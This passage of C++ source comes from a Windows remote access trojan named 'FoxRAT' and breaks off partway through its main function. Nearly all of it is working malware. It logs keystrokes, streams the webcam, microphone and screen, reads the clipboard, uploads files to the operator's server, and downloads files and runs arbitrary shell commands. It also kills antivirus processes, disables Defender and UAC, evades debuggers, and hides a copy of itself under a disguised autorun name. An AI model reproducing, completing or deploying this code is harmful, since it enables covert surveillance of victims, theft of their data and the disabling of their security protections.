        HFONT hf = CreateFontA(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, 0, 0, 0, 0, "Consolas");
        SelectObject(hdc, hf);
        SetTextColor(hdc, RGB(0, 255, 0));
        SetBkColor(hdc, RGB(0, 0, 0));
        for (int i = 0; i < 200; i++) {
            int x = rand() % sw, y = rand() % sh;
            char c = rand() % 94 + 33;
            TextOutA(hdc, x, y, &c, 1);
        }
        DeleteObject(hf);
        ReleaseDC(NULL, hdc);
        result = "matrix rain drawn";
    } else if (cmd == "glitch") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        for (int i = 0; i < 20; i++) {
            int y = rand() % sh;
            int h = rand() % 50 + 10;
            int offset = (rand() % 40) - 20;
            BitBlt(hdc, offset, y, sw, h, hdc, 0, y, SRCCOPY);
        }
        ReleaseDC(NULL, hdc);
        result = "screen glitched";
    } else if (cmd == "spiral") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        int cx = sw / 2, cy = sh / 2;
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
        SelectObject(hdc, pen);
        for (int i = 0; i < 500; i++) {
            double angle = i * 0.1;
            int r = i * 2;
            int x = cx + (int)(r * cos(angle));
            int y = cy + (int)(r * sin(angle));
            if (i == 0) MoveToEx(hdc, x, y, NULL);
            else LineTo(hdc, x, y);
        }
        DeleteObject(pen);
        ReleaseDC(NULL, hdc);
        result = "spiral drawn";
    } else if (cmd == "rainbow") {
        HDC hdc = GetDC(NULL);
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        for (int y = 0; y < sh; y += 4) {
            HBRUSH br = CreateSolidBrush(RGB((y * 3) % 256, (y * 5) % 256, (y * 7) % 256));
            RECT rc = { 0, y, sw, y + 4 };
            FillRect(hdc, &rc, br);
            DeleteObject(br);
        }
        ReleaseDC(NULL, hdc);
        result = "rainbow screen";
    } else if (cmd == "restorescreen") {
        InvalidateRect(NULL, NULL, TRUE);
        UpdateWindow(GetDesktopWindow());
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ALLCHILDREN | RDW_UPDATENOW);
        result = "screen restored";
    } else if (cmd == "taskbarhide") {
        HWND tb = FindWindowA("Shell_TrayWnd", NULL);
        if (tb) { ShowWindow(tb, SW_HIDE); result = "taskbar hidden"; }
        else result = "Error: taskbar not found";
    } else if (cmd == "taskbarshow") {
        HWND tb = FindWindowA("Shell_TrayWnd", NULL);
        if (tb) { ShowWindow(tb, SW_SHOW); result = "taskbar shown"; }
        else result = "Error: taskbar not found";
    } else if (cmd == "titlebar") {
        string text = rest();
        HWND fg = GetForegroundWindow();
        if (fg) {
            SetWindowTextA(fg, text.c_str());
            result = "title changed";
        } else result = "Error: no foreground window";
    } else if (cmd == "openurl") {
        string url = rest();
        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_HIDE);
        result = "url opened: " + url;
    } else if (cmd == "fakeerror") {
        string text = rest();
        MessageBoxA(NULL, text.c_str(), "Error", MB_ICONERROR | MB_OK);
        result = "fake error shown";
    } else if (cmd == "chat") {
        string action; ss >> action;
        if (action == "open") {
            string msg = rest();
            thread([msg]() {
                HWND hwnd = CreateWindowExA(WS_EX_TOPMOST, "#32770", "Message from h@ck3r",
                    WS_OVERLAPPED | WS_CAPTION | WS_VISIBLE,
                    CW_USEDEFAULT, CW_USEDEFAULT, 420, 180, NULL, NULL, GetModuleHandle(NULL), NULL);
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            HFONT hFont = CreateFontA(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, 0, 0, 0, 0, "Segoe UI");
            HWND hLabel = CreateWindowA("STATIC", "h@ck3r:", WS_CHILD | WS_VISIBLE, 10, 10, 60, 20, hwnd, NULL, NULL, NULL);
            SendMessage(hLabel, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hMsg = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", msg.c_str(),
                WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY,
                10, 32, 390, 90, hwnd, NULL, NULL, NULL);
            SendMessage(hMsg, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hHint = CreateWindowA("STATIC", "Only h@ck3r can close this window",
                WS_CHILD | WS_VISIBLE, 60, 130, 300, 20, hwnd, NULL, NULL, NULL);
            SendMessage(hHint, WM_SETFONT, (WPARAM)hFont, TRUE);
            MSG m;
            while (GetMessage(&m, NULL, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
            }).detach();
            result = "chat opened";
        } else if (action == "close") {
            HWND found = NULL;
            EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
                char title[256];
                GetWindowTextA(hwnd, title, 256);
                if (strcmp(title, "Message from h@ck3r") == 0) {
                    *(HWND*)lParam = hwnd;
                    return FALSE;
                }
                return TRUE;
            }, (LPARAM)&found);
            if (found) { PostMessage(found, WM_CLOSE, 0, 0); result = "chat closed"; }
            else result = "no chat window found";
        }
    } else if (cmd == "download") {
        string url, dlPath; ss >> url; dlPath = rest();
        if (dlPath.empty()) {
            char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
            auto pos = url.find_last_of('/'); string fname = (pos != string::npos) ? url.substr(pos + 1) : "dl";
            dlPath = string(tmp) + fname;
        }
        if (URLDownloadToFileA(NULL, url.c_str(), dlPath.c_str(), 0, NULL) == S_OK)
            result = "downloaded to " + dlPath;
        else result = "Error: download failed";
    } else if (cmd == "upload") {
        string path = rest();
        ifstream f(path, ios::binary);
        if (!f) { result = "Error: file not found"; sendCmdResult(result, seq); return; }
        vector<uint8_t> data((istreambuf_iterator<char>(f)), {});
        f.close();
        string b64 = base64Encode(data.data(), data.size());
        auto pos = path.find_last_of("/\\");
        string fname = (pos != string::npos) ? path.substr(pos + 1) : path;

        // Send via HTTP POST
        string postData = "{\"clientId\":" + jsonStr(g_clientId) + ",\"fileName\":" + jsonStr(fname) + ",\"data\":" + jsonStr(b64) + "}";
        HINTERNET hSession = WinHttpOpen(L"FoxRAT/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (hSession) {
            wstring wh(g_serverHost.begin(), g_serverHost.end());
            HINTERNET hConn = WinHttpConnect(hSession, wh.c_str(), g_serverPort, 0);
            if (hConn) {
                HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", L"/api/upload", NULL, NULL, NULL, 0);
                if (hReq) {
                    WinHttpSendRequest(hReq, L"Content-Type: application/json\r\n", -1, (LPVOID)postData.c_str(), (DWORD)postData.size(), (DWORD)postData.size(), 0);
                    WinHttpReceiveResponse(hReq, NULL);
                    WinHttpCloseHandle(hReq);
                }
                WinHttpCloseHandle(hConn);
            }
            WinHttpCloseHandle(hSession);
        }
        result = "uploaded " + fname + " (" + to_string(data.size()) + " bytes)";
    } else if (cmd == "process") {
        string action; ss >> action;
        if (action == "list") {
            result = "";
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe = { sizeof(pe) };
                if (Process32First(snap, &pe)) do {
                    char line[512]; sprintf(line, "%s (PID: %d)\n", pe.szExeFile, pe.th32ProcessID);
                    result += line;
                } while (Process32Next(snap, &pe));
                CloseHandle(snap);
            }
        } else if (action == "kill") {
            string name; ss >> name;
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            int killed = 0;
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe = { sizeof(pe) };
                if (Process32First(snap, &pe)) do {
                    if (_stricmp(pe.szExeFile, name.c_str()) == 0) {
                        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); killed++; }
                    }
                } while (Process32Next(snap, &pe));
                CloseHandle(snap);
            }
            result = "killed " + to_string(killed) + " process(es)";
        } else if (action == "start") {
            string name = rest();
            if ((int)ShellExecuteA(NULL, "open", name.c_str(), NULL, NULL, SW_HIDE) > 32)
                result = "started " + name;
            else result = "Error: start failed";
        }
    } else if (cmd == "idle") {
        LASTINPUTINFO lii = { sizeof(lii) };
        if (GetLastInputInfo(&lii)) {
            DWORD idle = GetTickCount() - lii.dwTime;
            char buf[64]; sprintf(buf, "Idle: %u min %u sec", idle / 60000, (idle / 1000) % 60);
            result = buf;
        } else result = "Error: GetLastInputInfo";
    } else if (cmd == "persist") {
        char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, sizeof(exePath));
        char appData[MAX_PATH]; SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
        string target = string(appData) + "\\FoxRAT.exe";
        CopyFileA(exePath, target.c_str(), FALSE);
        HKEY hk; RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk);
        RegSetValueExA(hk, "FoxRAT", 0, REG_SZ, (const BYTE*)target.c_str(), (DWORD)target.size() + 1);
        RegCloseKey(hk);
        result = "persistence added";
    } else if (cmd == "uninstall") {
        char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, sizeof(exePath));
        HKEY hk; RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hk);
        RegDeleteValueA(hk, "FoxRAT"); RegCloseKey(hk);
        string cmdLine = string("timeout /t 1 /nobreak > nul & del /f /q \"") + exePath + "\"";
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        result = "uninstalling";
        g_running = false;
    } else if (cmd == "keylog") {
        string action; ss >> action;
        if (action == "start" && !g_keylogging) {
            g_keylogging = true;
            g_keylogThread = thread([]() {
                // Low-level keyboard hook needs message loop
                g_keyhook = SetWindowsHookExA(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
                    if (nCode >= 0 && wParam == WM_KEYDOWN) {
                        KBDLLHOOKSTRUCT* khs = (KBDLLHOOKSTRUCT*)lParam;
                        char buf[16];
                        DWORD dwMsg = 1;
                        BYTE ks[256]; GetKeyboardState(ks);
                        ToAscii((UINT)khs->vkCode, khs->scanCode, ks, (LPWORD)buf, 0);
                        if (buf[0]) g_keylogBuffer += buf[0];
                    }
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }, g_hInst, 0);
                MSG msg;
                while (g_keylogging && GetMessage(&msg, NULL, 0, 0)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                if (g_keyhook) { UnhookWindowsHookEx(g_keyhook); g_keyhook = NULL; }
            });
            g_keylogThread.detach();
            result = "keylogger started";
        } else if (action == "stop") {
            g_keylogging = false;
            result = "keylogger stopped";
        } else if (action == "dump") {
            result = g_keylogBuffer;
            g_keylogBuffer.clear();
            if (result.empty()) result = "(empty)";
        }
    } else if (cmd == "blockav") {
        // Block AV - hosts file + kill procs + disable Defender + UAC
        const char* avDomains[] = {
            "kaspersky.com","eset.com","avast.com","avg.com","norton.com",
            "mcafee.com","bitdefender.com","trendmicro.com","sophos.com",
            "panda.com","malwarebytes.com","avira.com","f-secure.com",
            "comodo.com","drweb.com","360.cn","symantec.com","bullguard.com",
            "kaspersky.ru","drweb.ru",
            "defender.microsoft.com","update.microsoft.com",
            "download.windowsupdate.com","crl.microsoft.com"
        };
        char sysRoot[MAX_PATH]; GetEnvironmentVariableA("SystemRoot", sysRoot, sizeof(sysRoot));
        string hostsPath = string(sysRoot) + "\\System32\\drivers\\etc\\hosts";
        ofstream hosts(hostsPath, ios::app);
        if (hosts) {
            for (auto* d : avDomains) {
                hosts << "127.0.0.1 " << d << "\n127.0.1.1 www." << d << "\n";
            }
            hosts.close();
        }
        // Kill known AV processes
        const char* avProcs[] = {
            "MsMpEng.exe","NisSrv.exe","Sense.exe","WinDefend.exe",
            "avguard.exe","AVP.exe","ekrn.exe","egui.exe",
            "avastui.exe","AvastSvc.exe","AvastVBox.exe",
            "avgui.exe","AVGSvc.exe","McTray.exe","McAPExe.exe",
            "ccSvcHst.exe","NortonSecurity.exe","NS.exe",
            "bdagent.exe","BdDesktop.exe","SophosUI.exe",
            "MsSense.exe","smc.exe","SmcGui.exe",
            "VBA32Mpt.exe","Vba32Lst.exe",
            "FortiTray.exe","FortiSSLVPNClient.exe"
        };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (Process32First(snap, &pe)) do {
                for (auto* ap : avProcs) {
                    if (_stricmp(pe.szExeFile, ap) == 0) {
                        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
                    }
                }
            } while (Process32Next(snap, &pe));
            CloseHandle(snap);
        }
        // Disable Defender via registry
        HKEY hk;
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
        DWORD v = 1;
        RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
        v = 1;
        RegSetValueExA(hk, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
        // Disable UAC
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
        v = 0;
        RegSetValueExA(hk, "EnableLUA", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegSetValueExA(hk, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
        result = "AV blocked, UAC disabled";
    } else if (cmd == "livemon") {
        string action; ss >> action;
        if (action == "start" && !g_livemon) {
            g_livemon = true;
            g_livemonThread = thread([]() {
                CoInitializeEx(NULL, COINIT_MULTITHREADED);
                chrono::steady_clock::time_point lastSend;
                while (g_livemon) {
                    auto now = chrono::steady_clock::now();
                    if (now - lastSend < chrono::milliseconds(100)) {
                        this_thread::sleep_for(chrono::milliseconds(10));
                        continue;
                    }
                    lastSend = now;
                    try {
                        int sw = 0, sh = 0;
                        string b64 = execScreenshot(20, &sw, &sh);
                        if (!b64.empty() && g_ws.isConnected()) {
                            string data = jsonObj(jsonPair("type", jsonStr("screenshot")) + "," +
                                                  jsonPair("clientId", jsonStr(g_clientId)) + "," +
                                                  jsonPair("data", jsonStr(b64)) + "," +
                                                  jsonPair("w", jsonStr(to_string(sw))) + "," +
                                                  jsonPair("h", jsonStr(to_string(sh))));
                            g_ws.wsSend(data);
                        }
                    } catch (...) {}
                }
                CoUninitialize();
            });
            g_livemonThread.detach();
            result = "live monitor started";
        } else if (action == "stop") {
            g_livemon = false;
            result = "live monitor stopped";
        }
    } else if (cmd == "audio") {
        string action; ss >> action;
        if (action == "record") {
            int sec = 5; ss >> sec;
            if (sec < 1) sec = 1; if (sec > 30) sec = 30;
            g_capturing = true;
            thread([sec]() {
                CoInitializeEx(NULL, COINIT_MULTITHREADED);
                HWAVEIN hwi = NULL;
                WAVEFORMATEX wf = { WAVE_FORMAT_PCM, 1, 44100, 44100 * 2, 2, 16, 0 };
                int bufSize = 44100 * 2 * sec;
                vector<char> waveBuf(bufSize + 44);
                // WAV header
                memcpy(waveBuf.data(), "RIFF", 4);
                *(uint32_t*)(waveBuf.data() + 4) = bufSize + 36;
                memcpy(waveBuf.data() + 8, "WAVE", 4);
                memcpy(waveBuf.data() + 12, "fmt ", 4);
                *(uint32_t*)(waveBuf.data() + 16) = 16;
                *(uint16_t*)(waveBuf.data() + 20) = 1;  // PCM
                *(uint16_t*)(waveBuf.data() + 22) = 1;  // mono
                *(uint32_t*)(waveBuf.data() + 24) = 44100;
                *(uint32_t*)(waveBuf.data() + 28) = 44100 * 2;
                *(uint16_t*)(waveBuf.data() + 32) = 2;  // block align
                *(uint16_t*)(waveBuf.data() + 34) = 16; // bits
                memcpy(waveBuf.data() + 36, "data", 4);
                *(uint32_t*)(waveBuf.data() + 40) = bufSize;

                WAVEHDR wh = { waveBuf.data() + 44, bufSize, 0, 0, 0, 0, NULL, 0 };
                if (waveInOpen(&hwi, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
                    waveInPrepareHeader(hwi, &wh, sizeof(wh));
                    waveInAddBuffer(hwi, &wh, sizeof(wh));
                    waveInStart(hwi);
                    Sleep(sec * 1000);
                    waveInStop(hwi); waveInReset(hwi);
                    waveInUnprepareHeader(hwi, &wh, sizeof(wh));
                    waveInClose(hwi);
                }
                string b64 = base64Encode((uint8_t*)waveBuf.data(), bufSize + 44);
                string data = jsonObj(jsonPair("type", jsonStr("audio_data")) + "," +
                                      jsonPair("clientId", jsonStr(g_clientId)) + "," +
                                      jsonPair("data", jsonStr(b64)) + "," +
                                      jsonPair("duration", jsonStr(to_string(sec))));
                g_ws.wsSend(data);
                g_capturing = false;
                CoUninitialize();
            }).detach();
            result = "recording " + to_string(sec) + "s...";
        }
    } else if (cmd == "livemic") {
        string action; ss >> action;
        if (action == "start" && !g_livemic) {
            g_livemic = true;
            g_livemicThread = thread([]() {
                CoInitializeEx(NULL, COINIT_MULTITHREADED);
                while (g_livemic) {
                    try {
                        HWAVEIN hwi = NULL;
                        WAVEFORMATEX wf = { WAVE_FORMAT_PCM, 1, 22050, 22050 * 2, 2, 16, 0 };
                        int chunkMs = 500;
                        int bufSize = 22050 * 2 * chunkMs / 1000;
                        vector<char> waveBuf(bufSize + 44);
                        memcpy(waveBuf.data(), "RIFF", 4);
                        *(uint32_t*)(waveBuf.data() + 4) = bufSize + 36;
                        memcpy(waveBuf.data() + 8, "WAVE", 4);
                        memcpy(waveBuf.data() + 12, "fmt ", 4);
                        *(uint32_t*)(waveBuf.data() + 16) = 16;
                        *(uint16_t*)(waveBuf.data() + 20) = 1;
                        *(uint16_t*)(waveBuf.data() + 22) = 1;
                        *(uint32_t*)(waveBuf.data() + 24) = 22050;
                        *(uint32_t*)(waveBuf.data() + 28) = 22050 * 2;
                        *(uint16_t*)(waveBuf.data() + 32) = 2;
                        *(uint16_t*)(waveBuf.data() + 34) = 16;
                        memcpy(waveBuf.data() + 36, "data", 4);
                        *(uint32_t*)(waveBuf.data() + 40) = bufSize;
                        WAVEHDR wh = { waveBuf.data() + 44, bufSize, 0, 0, 0, 0, NULL, 0 };
                        if (waveInOpen(&hwi, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) == MMSYSERR_NOERROR) {
                            waveInPrepareHeader(hwi, &wh, sizeof(wh));
                            waveInAddBuffer(hwi, &wh, sizeof(wh));
                            waveInStart(hwi);
                            Sleep(chunkMs);
                            waveInStop(hwi); waveInReset(hwi);
                            waveInUnprepareHeader(hwi, &wh, sizeof(wh));
                            waveInClose(hwi);
                        }
                        if (g_ws.isConnected()) {
                            string b64 = base64Encode((uint8_t*)waveBuf.data(), bufSize + 44);
                            string data = jsonObj(jsonPair("type", jsonStr("audio_stream")) + "," +
                                                  jsonPair("clientId", jsonStr(g_clientId)) + "," +
                                                  jsonPair("data", jsonStr(b64)));
                            g_ws.wsSend(data);
                        }
                    } catch (...) {}
                }
                CoUninitialize();
            });
            g_livemicThread.detach();
            result = "live mic started";
        } else if (action == "stop") {
            g_livemic = false;
            result = "live mic stopped";
        }
    } else if (cmd == "webcam") {
        string action; ss >> action;
        if (action == "start" && !g_webcam) {
            g_webcam = true;
            g_webcamThread = thread([]() {
                while (g_webcam) {
                    string b64 = execWebcam(50);
                    if (!b64.empty() && g_ws.isConnected()) {
                        string data = jsonObj(jsonPair("type", jsonStr("webcam_data")) + "," +
                                              jsonPair("clientId", jsonStr(g_clientId)) + "," +
                                              jsonPair("data", jsonStr(b64)));
                        g_ws.wsSend(data);
                    }
                    this_thread::sleep_for(chrono::milliseconds(500));
                }
            });
            g_webcamThread.detach();
            result = "webcam started";
        } else if (action == "stop") {
            g_webcam = false;
            result = "webcam stopped";
        }
    } else if (cmd == "blockmouse") {
        string action; ss >> action;
        if (action == "start" && !g_blockmouse) {
            g_blockmouse = true;
            g_blockmouseThread = thread([]() {
                g_mousehook = SetWindowsHookExA(WH_MOUSE_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
                    if (nCode >= 0) return 1;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }, g_hInst, 0);
                MSG msg;
                while (g_blockmouse && GetMessage(&msg, NULL, 0, 0)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                if (g_mousehook) { UnhookWindowsHookEx(g_mousehook); g_mousehook = NULL; }
            });
            g_blockmouseThread.detach();
            result = "mouse blocked";
        } else if (action == "stop") {
            g_blockmouse = false;
            if (g_mousehook) { UnhookWindowsHookEx(g_mousehook); g_mousehook = NULL; }
            result = "mouse unblocked";
        }
    } else if (cmd == "blockkey") {
        string action; ss >> action;
        if (action == "start" && !g_blockkey) {
            g_blockkey = true;
            g_blockkeyThread = thread([]() {
                HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
                    if (nCode >= 0) return 1;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }, g_hInst, 0);
                MSG msg;
                while (g_blockkey && GetMessage(&msg, NULL, 0, 0)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                if (hook) { UnhookWindowsHookEx(hook); }
            });
            g_blockkeyThread.detach();
            result = "keyboard blocked";
        } else if (action == "stop") {
            g_blockkey = false;
            result = "keyboard unblocked";
        }
    } else if (cmd == "mouseclick") {
        string btn; ss >> btn;
        DWORD down, up;
        if (btn == "left") { down = MOUSEEVENTF_LEFTDOWN; up = MOUSEEVENTF_LEFTUP; }
        else if (btn == "right") { down = MOUSEEVENTF_RIGHTDOWN; up = MOUSEEVENTF_RIGHTUP; }
        else if (btn == "middle") { down = MOUSEEVENTF_MIDDLEDOWN; up = MOUSEEVENTF_MIDDLEUP; }
        else { result = "unknown button"; sendCmdResult(result, seq); return; }
        mouse_event(down, 0, 0, 0, 0);
        this_thread::sleep_for(chrono::milliseconds(50));
        mouse_event(up, 0, 0, 0, 0);
        result = btn + " clicked";
    } else if (cmd == "mousepos") {
        int x, y; ss >> x >> y;
        SetCursorPos(x, y);
        result = "moved";
    } else if (cmd == "dirlist") {
        string path = rest();
        if (path.empty()) path = "C:\\";
        result = "";
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                string name = fd.cFileName;
                if (name == "." || name == "..") continue;
                bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
                char line[512]; sprintf(line, "%s%s\t%llu\n", isDir ? "[DIR] " : "", name.c_str(), sz);
                result += line;
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
        if (result.empty()) result = "(empty)";
    } else if (cmd == "clipboard") {
        if (IsClipboardFormatAvailable(CF_TEXT) && OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* text = (char*)GlobalLock(hData);
                if (text) { result = text; GlobalUnlock(hData); }
            }
            CloseClipboard();
        }
        if (result.empty()) result = "(empty)";
    } else if (cmd == "sysinfo") {
        char buf[512];
        DWORD bufSize = sizeof(buf);
        GetComputerNameA(buf, &bufSize);
        string hostname = buf;
        DWORD uSize = sizeof(buf);
        GetUserNameA(buf, &uSize);
        string user = buf;
        OSVERSIONINFOA osvi = { sizeof(osvi) };
        GetVersionExA(&osvi);
        char osStr[128]; sprintf(osStr, "Windows %d.%d Build %d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        char ramStr[64]; sprintf(ramStr, "%llu MB", ms.ullTotalPhys / 1048576);
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_GROUP_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup);
        if (adminGroup) { CheckTokenMembership(NULL, adminGroup, &isAdmin); FreeSid(adminGroup); }
        sprintf(buf, "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\",\"ram\":\"%s\",\"admin\":\"%s\"}",
                hostname.c_str(), user.c_str(), osStr, ramStr, isAdmin ? "true" : "false");
        result = buf;
    } else if (cmd == "window list") {
        result = "";
        struct EnumData { string* res; } ed = { &result };
        EnumWindows([](HWND hwnd, LPARAM lp) -> BOOL {
            if (!IsWindowVisible(hwnd)) return TRUE;
            char title[256]; GetWindowTextA(hwnd, title, sizeof(title));
            if (strlen(title) > 0) {
                DWORD pid; GetWindowThreadProcessId(hwnd, &pid);
                char line[512]; sprintf(line, "%s (PID: %u)\n", title, pid);
                *((string*)lp) += line;
            }
            return TRUE;
        }, (LPARAM)&ed);
        if (result.empty()) result = "(no windows)";
    } else {
        // Treat as shell command
        result = execShell(cmdStr);
    }

    sendCmdResult(result, seq);
}

// ===== Admin check =====
bool isElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
    TOKEN_ELEVATION te;
    DWORD size = sizeof(te);
    bool elevated = GetTokenInformation(hToken, TokenElevation, &te, size, &size) && te.TokenIsElevated;
    CloseHandle(hToken);
    return elevated;
}

// ===== Main =====
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    g_hInst = hInst;

    // Anti-debug
    if (IsDebuggerPresent()) return 0;

    // Parse command line first (for persistence relocation and admin relaunch)
    g_serverHost = SERVER_HOST;
    g_serverPort = SERVER_PORT;
    char* cmdLine = GetCommandLineA();
    char* arg = strstr(cmdLine, "-host ");
    if (arg) { arg += 6; char* end = strchr(arg, ' '); if (end) { g_serverHost = string(arg, end - arg); } else g_serverHost = arg; }
    arg = strstr(cmdLine, "-port ");
    if (arg) { arg += 6; g_serverPort = atoi(arg); }

    // Admin elevation: if not admin, relaunch with runas verb (keep asking)
    if (!isElevated()) {
        char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, sizeof(exePath));
        string newArgs = "-host " + g_serverHost + " -port " + to_string(g_serverPort);
        ShellExecuteA(NULL, "runas", exePath, newArgs.c_str(), NULL, SW_SHOWDEFAULT);
        return 0;
    }

    // Hide console
    HWND cw = GetConsoleWindow();
    if (cw) ShowWindow(cw, SW_HIDE);

    // === Auto-persistence: copy to random system dir + autorun (only if not already there) ===
    char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, sizeof(exePath));
    char sysRoot[MAX_PATH]; GetEnvironmentVariableA("SystemRoot", sysRoot, sizeof(sysRoot));

    // Create directory tree recursively
    string hiddenDir = string(sysRoot) + "\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys";
    {
        string cur;
        for (char c : hiddenDir) {
            cur += c;
            if (c == '\\') CreateDirectoryA(cur.c_str(), NULL);
        }
        CreateDirectoryA(hiddenDir.c_str(), NULL);
    }
    SetFileAttributesA(hiddenDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    // Only install if NOT already running from the hidden directory
    string exeDir = string(exePath);
    size_t lastSlash = exeDir.find_last_of("\\/");
    if (lastSlash != string::npos) exeDir = exeDir.substr(0, lastSlash);
    if (_stricmp(exeDir.c_str(), hiddenDir.c_str()) != 0) {
        string exeName = randStr(6) + ".exe";
        string targetPath = hiddenDir + "\\" + exeName;
        if (CopyFileA(exePath, targetPath.c_str(), FALSE)) {
            SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            HKEY hk;
            RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
            RegSetValueExA(hk, "WindowsCacheService", 0, REG_SZ, (const BYTE*)targetPath.c_str(), (DWORD)targetPath.size() + 1);
            RegCloseKey(hk);
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            string relaunchCmd = "\"" + targetPath + "\" -host " + g_serverHost + " -port " + to_string(g_serverPort);
